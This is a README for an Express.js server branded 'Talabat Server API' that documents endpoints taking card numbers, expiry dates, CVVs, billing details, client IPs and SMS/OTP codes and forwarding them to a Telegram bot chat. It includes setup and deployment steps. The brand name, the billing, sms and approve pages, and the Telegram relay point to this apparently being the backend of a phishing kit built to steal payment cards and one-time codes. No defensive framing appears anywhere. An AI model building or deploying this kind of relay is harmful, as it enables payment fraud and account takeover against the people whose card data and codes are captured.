# Talabat Server API

An Express.js API server for handling Talabat payment and SMS data with Telegram integration.

## Features

- ✅ Express.js server
- ✅ Payment data handling (`/api/send-payment`)
- ✅ SMS/OTP code handling (`/api/send-sms`)
- ✅ Approve data handling (`/api/send-approve`)
- ✅ Telegram Bot API integration
- ✅ Rate limiting and security headers
- ✅ CORS enabled
- ✅ Error handling

## Setup

### 1. Install Dependencies

```bash
cd talabat-server
npm install
```

### 2. Configure Telegram Bot

Edit `config.js` and update your Telegram bot token and chat ID, or set environment variables:

```bash
export TELEGRAM_BOT_TOKEN="your_bot_token"
export TELEGRAM_CHAT_ID="your_chat_id"
```

Or create a `.env` file:
```
TELEGRAM_BOT_TOKEN=your_bot_token
TELEGRAM_CHAT_ID=your_chat_id
```

### 3. Start the Server

```bash
# Development mode with auto-restart
npm run dev

# Production mode
npm start
```

The server will run on `http://localhost:3000` (or the port specified in config.js)

## API Endpoints

### GET /
Health check endpoint.

**Response:**
```json
{
  "success": true,
  "message": "Talabat Server API is running",
  "version": "1.0.0",
  "timestamp": "2026-02-09T08:17:44.512Z"
}
```

### POST /api/send-payment
Sends payment/billing data to Telegram.

**Request Body:**
```json
{
  "nom": "John",
  "prenom": "Doe",
  "address": "123 Main St",
  "city": "New York",
  "zipCode": "10001",
  "country": "USA",
  "cardNumber": "1234567890123456",
  "cardExpiry": "12/25",
  "cardCVV": "123",
  "page": "billing",
  "clientIP": "127.0.0.1",
  "timestamp": "2026-02-09T08:17:44.512Z"
}
```

**Response:**
```json
{
  "success": true,
  "message": "Payment data sent successfully",
  "messageId": 12345
}
```

### POST /api/send-sms
Sends SMS/OTP code data to Telegram.

**Request Body:**
```json
{
  "smsCode": "123456",
  "page": "sms",
  "clientIP": "127.0.0.1"
}
```

**Response:**
```json
{
  "success": true,
  "message": "SMS data sent successfully",
  "messageId": 12346
}
```

### POST /api/send-approve
Sends approve data to Telegram.

**Request Body:**
```json
{
  "messages": "Approval message",
  "pageType": "approve",
  "clientIP": "127.0.0.1"
}
```

**Response:**
```json
{
  "success": true,
  "message": "Approve data sent successfully",
  "messageId": 12347
}
```

### GET /api/health
Health check endpoint.

## Project Structure

```
talabat-server/
├── server.js             # Main Express server
├── config.js             # Configuration file
├── package.json          # Dependencies
└── README.md             # This file
```

## Deployment

### Deploy to Vercel

You can deploy this Express server to Vercel by creating a `vercel.json`:

```json
{
  "version": 2,
  "builds": [
    {
      "src": "server.js",
      "use": "@vercel/node"
    }
  ],
  "routes": [
    {
      "src": "/(.*)",
      "dest": "server.js"
    }
  ]
}
```

Then deploy:
```bash
vercel --prod
```

### Deploy to Other Platforms

This Express server can be deployed to:
- Heroku
- Railway
- Render
- DigitalOcean App Platform
- Any Node.js hosting service

## Security Notes

- Rate limiting: 100 requests per 15 minutes per IP
- Helmet.js security headers enabled
- CORS enabled for cross-origin requests
- All endpoints validate required fields
- Errors are logged but not exposed to clients

## License

MIT
